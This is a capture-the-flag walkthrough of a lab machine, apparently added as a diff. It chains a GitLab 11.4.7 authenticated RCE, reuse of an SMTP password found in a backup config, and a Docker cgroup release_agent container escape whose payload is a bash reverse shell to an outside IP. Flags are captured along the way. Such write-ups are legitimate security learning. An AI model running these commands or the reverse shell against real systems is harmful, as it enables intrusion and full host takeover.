@@ -5,3 +5,74 @@ PORT     STATE SERVICE VERSION
 |   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
 |_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
 5080/tcp open  http    nginx
+I am presented with a Gitlab page. I create a new account
+testla : tesla@test.com : Tesla@2021 and after login, I note it is running "GitLab Community Edition 11.4.7"
+
+Searching around for Gitlab 11.4.7 exploit, I come across an authenticated RCE exploit.
+python3 exploit.py -u tesla -p Tesla@2021 -g http://10.10.10.220 -l 10.10.14.31 -P 443
+git@gitlab:~$ cd /home
+cd /home
+git@gitlab:/home$ ls
+ls
+dude
+git@gitlab:/home$ cd dude
+cd dude
+git@gitlab:/home/dude$ ls
+ls
+user.txt
+git@gitlab:/home/dude$ cat user.txt
+cat user.txt
+e1e30b052b6ec0670698805d745e7682
+=================Priv Escalation=======================
+[+] Is this a virtual machine? ..... Yes (docker)
+[+] Is this a container? ........... Looks like we're in a Docker container
+[+] Any running containers? ........ No
+
+[+] Looking for docker breakout techniques
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout
+
+Found /opt/backup/gitlab.rb
+gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#h"
+git@gitlab:/home/dude$ su
+su
+Password: wW59U!ZKMbG9+*#h
+
+root@gitlab:/home/dude# whoami
+whoami
+root
+root@gitlab:/home/dude# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+--------------------------------
+# In the container
+mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+
+echo 1 > /tmp/cgrp/x/notify_on_release
+host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+echo "$host_path/cmd" > /tmp/cgrp/release_agent
+
+#For a normal PoC =================
+echo '#!/bin/sh' > /cmd
+echo "ps aux > $host_path/output" >> /cmd
+chmod a+x /cmd
+#===================================
+#Reverse shell
+echo '#!/bin/bash' > /cmd
+echo "bash -i >& /dev/tcp/10.10.14.31/4444 0>&1" >> /cmd
+chmod a+x /cmd
+#===================================
+
+sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+-------------------------------------------
+root@ready:/# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+root@ready:/root# ls
+ls
+docker-gitlab
+ready-channel
+root.txt
+snap
+root@ready:/root# cat root.txt
+cat root.txt
+b7f98681505cd39066f67147b103c2b3
